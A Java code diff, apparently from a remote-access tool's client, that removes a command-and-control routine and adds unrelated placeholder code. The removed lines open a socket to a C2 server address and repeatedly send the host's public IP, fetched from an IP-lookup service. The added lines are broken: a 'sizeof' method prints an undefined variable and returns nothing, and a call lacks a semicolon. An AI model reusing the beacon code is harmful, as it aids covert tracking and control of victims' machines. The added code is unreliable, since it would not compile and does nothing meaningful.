@@ -4,14 +4,15 @@ import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.net.HttpURLConnection;
 import java.net.URL;
+
+import exs.shared.StringBuilder;
+
 import java.io.PrintWriter;
 import java.net.Socket;
 //Screen Shot Support:NO
-
-public class main {
-    
+class Funcs {
     public static String GetIpAddr() {
-        String Data = "0.0.0.0";
+        final String Data = "0.0.0.0";
         String API_URL = "https://api.ipify.org";
         try {
             URL url = new URL(API_URL);
@@ -31,53 +32,19 @@ public class main {
         }
 
     }
-    private static Socket socket = null;
-    private static PrintWriter out = null;
-
-    private static void createSocketAndWriter() {
-        try {
-            if (socket == null) {
-                socket = new Socket(data.C2_SERVER_IP, data.C2_SERVER_PORT);
-            }
-            if (out == null) {
-                out = new PrintWriter(socket.getOutputStream(), true);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-    private static void closeSocket() {
-        try {
-            if (socket != null) {
-                socket.close();
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
-    private static void sendDataString(String d){
-        try {
-            if (socket != null){
-                out.println(d);
-            }
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
+    public static int sizeof(Object a){
+        //get the byte size of the object
+        String type = Object.class.getTypeName();
+        System.out.println(types);
     }
     
+}
+public class main {
+    
     public static void main(String[] args) {
-        createSocketAndWriter();
-
-        byte IpSentCount = 0;
-
-        while(true) {
-
-            if(IpSentCount>=1){
-                closeSocket();
-            } else {
-                sendDataString("IP:"+GetIpAddr());
-            }
-        }
+        short ARG_1 = 1;
+        Funcs.sizeof(args)
+        
     }
     
     private static void log(String d) {
